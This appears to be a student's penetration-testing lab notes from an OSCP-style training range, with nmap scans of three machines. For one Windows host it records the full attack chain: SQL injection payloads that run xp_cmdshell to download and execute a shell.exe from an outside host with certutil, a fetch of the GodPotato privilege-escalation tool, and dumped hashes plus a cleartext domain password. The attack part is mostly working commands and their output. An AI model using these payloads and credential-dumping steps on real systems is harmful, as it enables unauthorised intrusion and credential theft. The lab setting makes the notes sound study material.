# VM 3
- ?
- ```
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
    | ssh-hostkey: 
    |   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
    |   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
    |_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
    80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
    |_http-title: PAW! (PWK Awesome Website)
    |_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  ```
## Foothold


# VM 4 (pwned)
- Web02
- Microsoft Windows Server 2022 Standard
- 10.0.20348 N/A Build 20348

## FootHold
- Ez SQLi
    ``` 
    ';EXEC master.dbo.xp_cmdshell 'ping 192.168.45.219';--
    ';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://192.168.45.219/shell.exe C:\\Windows\temp\shell.exe';--
    ';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe';--
    ```
## Root 
- SeImpersonate Permission Found & NET4.0 -> GodPotato
  ```
    iwr -uri http://192.168.45.155/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
    .\GodPotato-NET4.exe -cmd 'whoami'
    .\GodPotato-NET4.exe -cmd 'C:\Windows\temp\shell.exe'
   ```
- Interesting Info
    1. ``` 
            Version: NetNTLMv2
            Hash:    WEB02$::MEDTECH:1122334455667788:757d0de376d8456d510a56bbc91d2ab2:0101000000000000229fe7efdce0da013a25e15c16fb223a000000000800300030000000000000000000000000300000d8c929a18f8306528b604ac0f3f091c5301c8c3d9d4689b5c867902e15f0f4230a00100000000000000000000000000000000000090000000000000000000000
      ```
    2. Joe 
      ```
        Authentication Id : 0 ; 283886 (00000000:000454ee)
        Session           : Service from 0
        User Name         : joe
        Domain            : MEDTECH
        Logon Server      : DC01
        Logon Time        : 4/8/2024 12:06:58 PM
        SID               : S-1-5-21-976142013-3766213998-138799841-1106
                msv :
                [00000003] Primary
                * Username : joe
                * Domain   : MEDTECH
                * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
                * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
                * DPAPI    : 58de53296298ce0f98087ae902c88735
                tspkg :
                wdigest :
                * Username : joe
                * Domain   : MEDTECH
                * Password : (null)
                kerberos :
                * Username : joe
                * Domain   : MEDTECH.COM
                * Password : Flowers1
                ssp :
                credman :
                cloudap :
        ```

# VM 5
- ?
- ```
    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
    |_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
    1194/tcp open  openvpn?
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
